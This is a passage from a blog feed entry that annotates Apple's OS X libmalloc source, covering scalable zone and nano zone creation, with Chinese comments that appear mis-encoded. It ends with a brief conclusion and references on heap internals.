class="keyword">void</span>)__sync_bool_compare_and_swap(&amp;entropic_limit, <span class="number">0</span>, t); <span class="comment">// Just one initialization please</span></span><br><span class="line">			(<span class="keyword">void</span>)__sync_bool_compare_and_swap(&amp;entropic_address, <span class="number">0</span>, t - ENTROPIC_KABILLION); <span class="comment">// Just one initialization please</span></span><br><span class="line">		&#125;</span><br><span class="line">		debug_flags &amp;= ~DISABLE_ASLR;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// zero slide when ASLR has been disabled by boot-arg. Eliminate cloaking.</span></span><br><span class="line">		malloc_entropy[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">		malloc_entropy[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">		debug_flags |= DISABLE_ASLR;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">	malloc_entropy[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	malloc_entropy[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	debug_flags |= DISABLE_ASLR;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">// ---------å¤„ç†ASLRç›¸å…³çš„å†…å®¹---------------------------------end---------------</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Initialize the security token.</span></span><br><span class="line">	<span class="comment">// ---------åˆå§‹åŒ–å¤–éƒ¨è°ƒç”¨å‡½æ•°---------------------------------start-------------</span></span><br><span class="line">	szone-&gt;cookie = (<span class="keyword">uintptr_t</span>)malloc_entropy[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">	szone-&gt;basic_zone.version = <span class="number">8</span>;</span><br><span class="line">	szone-&gt;basic_zone.size = (<span class="keyword">void</span> *)szone_size;</span><br><span class="line">	szone-&gt;basic_zone.<span class="built_in">malloc</span> = (<span class="keyword">void</span> *)szone_malloc;</span><br><span class="line">	szone-&gt;basic_zone.<span class="built_in">calloc</span> = (<span class="keyword">void</span> *)szone_calloc;</span><br><span class="line">	szone-&gt;basic_zone.valloc = (<span class="keyword">void</span> *)szone_valloc;</span><br><span class="line">	szone-&gt;basic_zone.<span class="built_in">free</span> = (<span class="keyword">void</span> *)szone_free;</span><br><span class="line">	szone-&gt;basic_zone.<span class="built_in">realloc</span> = (<span class="keyword">void</span> *)szone_realloc;</span><br><span class="line">	szone-&gt;basic_zone.destroy = (<span class="keyword">void</span> *)szone_destroy;</span><br><span class="line">	szone-&gt;basic_zone.batch_malloc = (<span class="keyword">void</span> *)szone_batch_malloc;</span><br><span class="line">	szone-&gt;basic_zone.batch_free = (<span class="keyword">void</span> *)szone_batch_free;</span><br><span class="line">	szone-&gt;basic_zone.introspect = (<span class="keyword">struct</span> <span class="keyword">malloc_introspection_t</span> *)&amp;szone_introspect;</span><br><span class="line">	szone-&gt;basic_zone.memalign = (<span class="keyword">void</span> *)szone_memalign;</span><br><span class="line">	szone-&gt;basic_zone.free_definite_size = (<span class="keyword">void</span> *)szone_free_definite_size;</span><br><span class="line">	szone-&gt;basic_zone.pressure_relief = (<span class="keyword">void</span> *)szone_pressure_relief;</span><br><span class="line"></span><br><span class="line">	szone-&gt;basic_zone.reserved1 = <span class="number">0</span>; <span class="comment">/* Set to zero once and for all as required by CFAllocator. */</span></span><br><span class="line">	szone-&gt;basic_zone.reserved2 = <span class="number">0</span>; <span class="comment">/* Set to zero once and for all as required by CFAllocator. */</span></span><br><span class="line">	mprotect(szone, <span class="keyword">sizeof</span>(szone-&gt;basic_zone), PROT_READ); <span class="comment">/* Prevent overwriting the function pointers in basic_zone. */</span></span><br><span class="line"></span><br><span class="line">	szone-&gt;debug_flags = debug_flags;</span><br><span class="line">	_malloc_lock_init(&amp;szone-&gt;large_szone_lock);</span><br><span class="line">	<span class="comment">// ---------åˆå§‹åŒ–å¤–éƒ¨è°ƒç”¨å‡½æ•°---------------------------------end-------------</span></span><br><span class="line">	</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__ppc__) || defined(__ppc64__)</span></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * In the interest of compatibility for PPC applications executing via Rosetta,</span><br><span class="line">	 * arrange to zero-fill allocations as occurred by side effect in Leopard and earlier.</span><br><span class="line">	 */</span></span><br><span class="line">	zeroify_scalable_zone((<span class="keyword">malloc_zone_t</span> *)szone);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	szone-&gt;cpu_id_key = -<span class="number">1U</span>L; <span class="comment">// Unused.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Query the number of configured processors.</span></span><br><span class="line">	<span class="comment">// Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives</span></span><br><span class="line">	<span class="comment">// the same behavior as the original scalable malloc. MP gets per-CPU magazines</span></span><br><span class="line">	<span class="comment">// that scale (way) better.</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__i386__) || defined(__x86_64__) || defined(__arm__) || defined(__arm64__)</span></span><br><span class="line">	<span class="keyword">int</span> nproc = *(<span class="keyword">uint8_t</span> *)(<span class="keyword">uintptr_t</span>)_COMM_PAGE_NCPUS;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="keyword">int</span> nproc = sysconf(_SC_NPROCESSORS_CONF);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// ------ä¸ºæ¯ä¸ªä¸€ä¸ªcpuéƒ½ç”³è¯·ä¸€ä¸ªtinyçš„å†…å­˜ç©ºé—´ï¼Œå¹¶åˆå§‹åŒ–ç›¸å…³æ•°æ®--------start</span></span><br><span class="line">	<span class="comment">//æ ¹æ®cpuçš„æ ¹æ•°ï¼Œè®¡ç®—è·å¾—éœ€è¦å¤šå°‘ä¸ªtinyçš„å†…å­˜ç©ºé—´</span></span><br><span class="line">	szone-&gt;num_tiny_magazines = (nproc &gt; <span class="number">1</span>) ? MIN(nproc, TINY_MAX_MAGAZINES) : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// FIXME vm_allocate() based on number of configured CPUs</span></span><br><span class="line">	<span class="comment">//ç”³è¯·éœ€è¦çš„å†…å­˜ç©ºé—´</span></span><br><span class="line">	<span class="keyword">magazine_t</span> *tiny_magazines = allocate_pages(<span class="literal">NULL</span>, TINY_MAGAZINE_PAGED_SIZE, <span class="number">0</span>,</span><br><span class="line">												SCALABLE_MALLOC_ADD_GUARD_PAGES, VM_MEMORY_MALLOC);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == tiny_magazines)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//å°†ç”³è¯·çš„å†…å­˜ç©ºé—´èµ‹å€¼åˆ°szoneä¸­ç›¸å…³çš„å­—æ®µä¸Š</span></span><br><span class="line">	szone-&gt;tiny_magazines = &amp;(tiny_magazines[<span class="number">1</span>]); <span class="comment">// szone-&gt;tiny_magazines[-1] is the Depot</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// The magazines are indexed in [0 .. (num_tiny_magazines - 1)]</span></span><br><span class="line">	<span class="comment">// Find the smallest power of 2 that exceeds (num_tiny_magazines - 1)</span></span><br><span class="line">	<span class="comment">// é€šè¿‡è®¡ç®—è·å–num_tiny_magazines_mask_shiftçš„å€¼</span></span><br><span class="line">	<span class="comment">// num_tiny_magazines_mask_shift = log2(szone-&gt;num_tiny_magazines-1)</span></span><br><span class="line">	szone-&gt;num_tiny_magazines_mask_shift = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">while</span>( i &lt;= (szone-&gt;num_tiny_magazines - <span class="number">1</span>) ) &#123;</span><br><span class="line">		szone-&gt;num_tiny_magazines_mask_shift++;</span><br><span class="line">		i &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now if i &lt;= TINY_MAX_MAGAZINES we'll never access tiny_magazines[] out of bounds.</span></span><br><span class="line">	<span class="keyword">if</span> (i &gt; TINY_MAX_MAGAZINES) &#123;</span><br><span class="line">		malloc_printf(<span class="string">"*** FATAL ERROR - magazine mask exceeds allocated magazines.\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Reduce i by 1 to obtain a mask covering [0 .. (num_tiny_magazines - 1)]</span></span><br><span class="line">	szone-&gt;num_tiny_magazines_mask = i - <span class="number">1</span>; <span class="comment">// A mask used for hashing to a magazine index (and a safety aid)</span></span><br><span class="line">	szone-&gt;last_tiny_advise = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Init the tiny_magazine locks</span></span><br><span class="line">	_malloc_lock_init(&amp;szone-&gt;tiny_regions_lock);</span><br><span class="line">	_malloc_lock_init(&amp;szone-&gt;tiny_magazines[DEPOT_MAGAZINE_INDEX].magazine_lock);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; szone-&gt;num_tiny_magazines; ++i) &#123;</span><br><span class="line">		_malloc_lock_init(&amp;szone-&gt;tiny_magazines[i].magazine_lock);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// ------ä¸ºæ¯ä¸ªä¸€ä¸ªcpuéƒ½ç”³è¯·ä¸€ä¸ªtinyçš„å†…å­˜ç©ºé—´ï¼Œå¹¶åˆå§‹åŒ–ç›¸å…³æ•°æ®--------end</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// ------ä¸ºæ¯ä¸ªä¸€ä¸ªcpuéƒ½ç”³è¯·ä¸€ä¸ªsmallçš„å†…å­˜ç©ºé—´ï¼Œå¹¶åˆå§‹åŒ–ç›¸å…³æ•°æ®--------start</span></span><br><span class="line">	szone-&gt;num_small_magazines = (nproc &gt; <span class="number">1</span>) ? MIN(nproc, SMALL_MAX_MAGAZINES) : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// FIXME vm_allocate() based on number of configured CPUs</span></span><br><span class="line">	<span class="keyword">magazine_t</span> *small_magazines = allocate_pages(<span class="literal">NULL</span>, SMALL_MAGAZINE_PAGED_SIZE, <span class="number">0</span>,</span><br><span class="line">												 SCALABLE_MALLOC_ADD_GUARD_PAGES, VM_MEMORY_MALLOC);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == small_magazines)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	szone-&gt;small_magazines = &amp;(small_magazines[<span class="number">1</span>]); <span class="comment">// szone-&gt;small_magazines[-1] is the Depot</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// The magazines are indexed in [0 .. (num_small_magazines - 1)]</span></span><br><span class="line">	<span class="comment">// Find the smallest power of 2 that exceeds (num_small_magazines - 1)</span></span><br><span class="line">	szone-&gt;num_small_magazines_mask_shift = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>( i &lt;= (szone-&gt;num_small_magazines - <span class="number">1</span>) ) &#123;</span><br><span class="line">		szone-&gt;num_small_magazines_mask_shift++;</span><br><span class="line">		i &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Now if i &lt;= SMALL_MAX_MAGAZINES we'll never access small_magazines[] out of bounds.</span></span><br><span class="line">	<span class="keyword">if</span> (i &gt; SMALL_MAX_MAGAZINES) &#123;</span><br><span class="line">		malloc_printf(<span class="string">"*** FATAL ERROR - magazine mask exceeds allocated magazines.\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Reduce i by 1 to obtain a mask covering [0 .. (num_small_magazines - 1)]</span></span><br><span class="line">	szone-&gt;num_small_magazines_mask = i - <span class="number">1</span>; <span class="comment">// A mask used for hashing to a magazine index (and a safety aid)</span></span><br><span class="line">	szone-&gt;last_small_advise = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Init the small_magazine locks</span></span><br><span class="line">	_malloc_lock_init(&amp;szone-&gt;small_regions_lock);</span><br><span class="line">	_malloc_lock_init(&amp;szone-&gt;small_magazines[DEPOT_MAGAZINE_INDEX].magazine_lock);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; szone-&gt;num_small_magazines; ++i) &#123;</span><br><span class="line">		_malloc_lock_init(&amp;szone-&gt;small_magazines[i].magazine_lock);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CHECK(szone, __PRETTY_FUNCTION__);</span><br><span class="line">	<span class="comment">// ------ä¸ºæ¯ä¸ªä¸€ä¸ªcpuéƒ½ç”³è¯·ä¸€ä¸ªsmallçš„å†…å­˜ç©ºé—´ï¼Œå¹¶åˆå§‹åŒ–ç›¸å…³æ•°æ®--------end</span></span><br><span class="line">	<span class="comment">//é€»è¾‘ä¸tinyç›¸åŒï¼Œåªæ˜¯å˜é‡ä¸åŒ</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">malloc_zone_t</span> *)szone;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="create_nano_zone">create_nano_zone</h3><p>å¯¹<code>nano_zone</code>çš„åˆ›å»ºå°±ç›¸å¯¹ç®€å•å¾ˆå¤šï¼Œè¿™é‡Œä¸å¤šåšåˆ†æï¼Œç›´æ¥çœ‹æ³¨é‡Šçš„æºç ã€‚<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((visibility(<span class="string">"hidden"</span>)))</span><br><span class="line"><span class="keyword">malloc_zone_t</span> *</span><br><span class="line">create_nano_zone(<span class="keyword">size_t</span> initial_size, <span class="keyword">malloc_zone_t</span> *helper_zone, <span class="keyword">unsigned</span> debug_flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">nanozone_t</span>	*nanozone;</span><br><span class="line">	<span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!_malloc_engaged_nano) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//æ£€æµ‹comm pageçš„ç‰ˆæœ¬</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__x86_64__)</span></span><br><span class="line">	<span class="keyword">if</span> (_COMM_PAGE_VERSION_REQD &gt; (*((<span class="keyword">uint16_t</span> *)_COMM_PAGE_VERSION))) &#123;</span><br><span class="line">		malloc_printf(<span class="string">"*** FATAL ERROR - comm page version mismatch.\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* get memory for the zone. */</span></span><br><span class="line">	<span class="comment">//ç”³è¯·nanozoneæ•°æ®ç»“æ„å¤§å°çš„å†…å­˜</span></span><br><span class="line">	nanozone = allocate_pages(<span class="literal">NULL</span>, SZONE_PAGED_SIZE, <span class="number">0</span>, <span class="number">0</span>, VM_MEMORY_MALLOC);</span><br><span class="line">	<span class="keyword">if</span> (!nanozone)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* set up the basic_zone portion of the nanozone structure */</span></span><br><span class="line">	<span class="comment">//è®¾ç½®å¤–éƒ¨è°ƒç”¨å‡½æ•°</span></span><br><span class="line">	nanozone-&gt;basic_zone.version = <span class="number">8</span>;</span><br><span class="line">	nanozone-&gt;basic_zone.size = (<span class="keyword">void</span> *)nano_size;</span><br><span class="line">	nanozone-&gt;basic_zone.<span class="built_in">malloc</span> = (debug_flags &amp; SCALABLE_MALLOC_DO_SCRIBBLE) ? (<span class="keyword">void</span> *)nano_malloc_scribble : (<span class="keyword">void</span> *)nano_malloc;</span><br><span class="line">	nanozone-&gt;basic_zone.<span class="built_in">calloc</span> = (<span class="keyword">void</span> *)nano_calloc;</span><br><span class="line">	nanozone-&gt;basic_zone.valloc = (<span class="keyword">void</span> *)nano_valloc;</span><br><span class="line">	nanozone-&gt;basic_zone.<span class="built_in">free</span> = (debug_flags &amp; SCALABLE_MALLOC_DO_SCRIBBLE) ? (<span class="keyword">void</span> *)nano_free_scribble : (<span class="keyword">void</span> *)nano_free;</span><br><span class="line">	nanozone-&gt;basic_zone.<span class="built_in">realloc</span> = (<span class="keyword">void</span> *)nano_realloc;</span><br><span class="line">	nanozone-&gt;basic_zone.destroy = (<span class="keyword">void</span> *)nano_destroy;</span><br><span class="line">	nanozone-&gt;basic_zone.batch_malloc = (<span class="keyword">void</span> *)nano_batch_malloc;</span><br><span class="line">	nanozone-&gt;basic_zone.batch_free = (<span class="keyword">void</span> *)nano_batch_free;</span><br><span class="line">	nanozone-&gt;basic_zone.introspect = (<span class="keyword">struct</span> <span class="keyword">malloc_introspection_t</span> *)&amp;nano_introspect;</span><br><span class="line">	nanozone-&gt;basic_zone.memalign = (<span class="keyword">void</span> *)nano_memalign;</span><br><span class="line">	nanozone-&gt;basic_zone.free_definite_size = (debug_flags &amp; SCALABLE_MALLOC_DO_SCRIBBLE) ?</span><br><span class="line">	(<span class="keyword">void</span> *)nano_free_definite_size_scribble : (<span class="keyword">void</span> *)nano_free_definite_size;</span><br><span class="line">	</span><br><span class="line">	nanozone-&gt;basic_zone.pressure_relief = (<span class="keyword">void</span> *)nano_pressure_relief;</span><br><span class="line">	</span><br><span class="line">	nanozone-&gt;basic_zone.reserved1 = <span class="number">0</span>; <span class="comment">/* Set to zero once and for all as required by CFAllocator. */</span></span><br><span class="line">	nanozone-&gt;basic_zone.reserved2 = <span class="number">0</span>; <span class="comment">/* Set to zero once and for all as required by CFAllocator. */</span></span><br><span class="line">	</span><br><span class="line">	mprotect(nanozone, <span class="keyword">sizeof</span>(nanozone-&gt;basic_zone), PROT_READ); <span class="comment">/* Prevent overwriting the function pointers in basic_zone. */</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* set up the remainder of the nanozone structure */</span></span><br><span class="line">	nanozone-&gt;debug_flags = debug_flags;</span><br><span class="line">	nanozone-&gt;our_signature = NANOZONE_SIGNATURE;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Query the number of configured processors. */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> defined(__x86_64__)</span></span><br><span class="line">	nanozone-&gt;phys_ncpus = *(<span class="keyword">uint8_t</span> *)(<span class="keyword">uintptr_t</span>)_COMM_PAGE_PHYSICAL_CPUS;</span><br><span class="line">	nanozone-&gt;logical_ncpus = *(<span class="keyword">uint8_t</span> *)(<span class="keyword">uintptr_t</span>)_COMM_PAGE_LOGICAL_CPUS;</span><br><span class="line"><span class="preprocessor">#<span class="keyword">else</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">error</span> Unknown architecture</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//æ ¹æ®cpuçš„ä¸åŒï¼Œå¯¹meta_dataè¿›è¡Œåˆå§‹åŒ–</span></span><br><span class="line">	<span class="keyword">if</span> (nanozone-&gt;phys_ncpus &gt; <span class="keyword">sizeof</span>(nanozone-&gt;core_mapped_size)/<span class="keyword">sizeof</span>(nanozone-&gt;core_mapped_size[<span class="number">0</span>])) &#123;</span><br><span class="line">		_malloc_printf(ASL_LEVEL_NOTICE, <span class="string">"nano zone abandoned because NCPUS mismatch.\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> != (nanozone-&gt;logical_ncpus % nanozone-&gt;phys_ncpus)) &#123;</span><br><span class="line">		malloc_printf(<span class="string">"*** FATAL ERROR - logical_ncpus % phys_ncpus != 0.\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">switch</span> (nanozone-&gt;logical_ncpus/nanozone-&gt;phys_ncpus) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			nanozone-&gt;hyper_shift = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			nanozone-&gt;hyper_shift = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			nanozone-&gt;hyper_shift = <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			malloc_printf(<span class="string">"*** FATAL ERROR - logical_ncpus / phys_ncpus not 1, 2, or 4.\n"</span>);</span><br><span class="line">			<span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Initialize slot queue heads and resupply locks. */</span></span><br><span class="line">	<span class="comment">//#define	OS_ATOMIC_QUEUE_INIT	&#123; NULL, 0 &#125;</span></span><br><span class="line">	OSQueueHead q0 = OS_ATOMIC_QUEUE_INIT; <span class="comment">//&#123;NULL,0&#125;</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nanozone-&gt;phys_ncpus; ++i) &#123;</span><br><span class="line">        _malloc_lock_init(&amp;nanozone-&gt;band_resupply_lock[i]);</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; NANO_SLOT_SIZE; ++j) &#123;</span><br><span class="line">			nanozone-&gt;meta_data[i][j].slot_LIFO = q0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//å¯¹åœ°å€éšæœºåŒ–åšå¤„ç†ã€‚</span></span><br><span class="line">	<span class="comment">/* Initialize the security token. */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == _dyld_get_image_slide((<span class="keyword">const</span> <span class="keyword">struct</span> mach_header*)_NSGetMachExecuteHeader())) &#123;</span><br><span class="line">		<span class="comment">// zero slide when ASLR has been disabled by boot-arg. Eliminate cloaking.</span></span><br><span class="line">		malloc_entropy[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">		malloc_entropy[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	nanozone-&gt;cookie = (<span class="keyword">uintptr_t</span>)malloc_entropy[<span class="number">0</span>] &amp; <span class="number">0x0000ffffffff0000</span>ULL; <span class="comment">// scramble central 32bits with this cookie</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Nano zone does not support SCALABLE_MALLOC_ADD_GUARD_PAGES. */</span></span><br><span class="line">	<span class="keyword">if</span> (nanozone-&gt;debug_flags &amp; SCALABLE_MALLOC_ADD_GUARD_PAGES) &#123;</span><br><span class="line">		_malloc_printf(ASL_LEVEL_INFO, <span class="string">"nano zone does not support guard pages\n"</span>);</span><br><span class="line">		nanozone-&gt;debug_flags &amp;= ~SCALABLE_MALLOC_ADD_GUARD_PAGES;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	nanozone-&gt;helper_zone = helper_zone;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">malloc_zone_t</span> *)nanozone;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="å°ç»“">å°ç»“</h1><p>è‡³æ­¤ï¼Œ<code>nano_zone</code>å’Œ<code>scalable_zone</code>çš„æ•°æ®ç»“æ„ç»„æˆï¼Œä»¥åŠå…¶æ•°æ®åˆå§‹åŒ–ä¹‹åçš„åˆ†å¸ƒï¼Œå·²ç»å¤§è‡´çš„åˆ†æå®Œæˆäº†ï¼Œä¸‹ä¸€ç¯‡æ–‡ç« ï¼Œå°†é€šè¿‡å¯¹<code>nano_malloc</code>ä»¥åŠ<code>nano_free</code>çš„ç®€å•åˆ†æï¼Œæ¥ç†è§£<code>nano_zone</code>çš„ä½¿ç”¨æƒ…å†µã€‚</p>
<h1 id="reference">reference</h1><p>1.iOSå†…å­˜ç®¡ç†å’Œmallocæºç è§£è¯»</p>
<p><a href="https://yq.aliyun.com/articles/3065" target="_blank" rel="external">https://yq.aliyun.com/articles/3065</a></p>
<p>2.OS X heap exploitation techniques</p>
<p><a href="http://phrack.org/issues/63/5.html#article" target="_blank" rel="external">http://phrack.org/issues/63/5.html#article</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="æ‘˜è¦">æ‘˜è¦</h1><p>ä¸ºäº†åŠ æ·±å¯¹<code>OS X</code>ç³»ç»Ÿåœ¨åº”ç”¨å±‚å †å†…å­˜åˆ†é…çš„äº†è§£ï¼Œå¯¹<code>libmalloc</code>è¿›è¡Œäº†é˜…è¯»ä¸ç†è§£ã€‚</p>
<ul>
<li>åŠ å¼ºå¯¹å †ä¸Šå†…å­˜åˆ†å¸ƒçš„ç†è§£</li>
<li>é‡åˆ°å†…å­˜æ³„éœ²é—®é¢˜éœ€è¦å¤„ç†æ—¶ï¼Œå¯¹å †åˆ†é…ç­–ç•¥çš„äº†è§£ï¼Œå¯ä»¥æé«˜åˆ†æçš„é€Ÿåº¦ä¸ç²¾ç¡®åº¦</li>
<li>é‡åˆ°å †å†…å­˜æ¼æ´åˆ©ç”¨æ—¶ï¼Œå¯ä»¥æ›´åŠ æ¸…æ¥šçš„ç†è§£<code>EXP</code>çš„åŸç†ï¼Œåšå‡ºæ›´ç²¾å‡†çš„åˆ†æ</li>
</ul>
<p>é˜…è¯»æœ¬æ–‡ä¹‹å‰å¯ä»¥å…ˆç¨å¾®äº†è§£ä¸€ä¸‹<code>OS X</code>åœ¨å †ä¸Šçš„å†…å­˜å¤„ç†çš„å¤§è‡´æƒ…å†µï¼Œç‚¹<a href="https://yq.aliyun.com/articles/3065">è¿™é‡Œ</a>ã€‚äº†è§£å¤§è‡´æƒ…å†µä¹‹åï¼Œæ‰èƒ½æ›´å¥½çš„ç†è§£æºç çš„è®¾è®¡ã€‚</p>]]>
    
    </summary>
    
      <category term="malloc" scheme="http://turingh.github.io/tags/malloc/"/>
    
      <category term="åŸºæœ¬åŠŸè¦æ‰å®" scheme="http://turingh.github.io/tags/%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%A6%81%E6%89%8E%E5%AE%9E/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
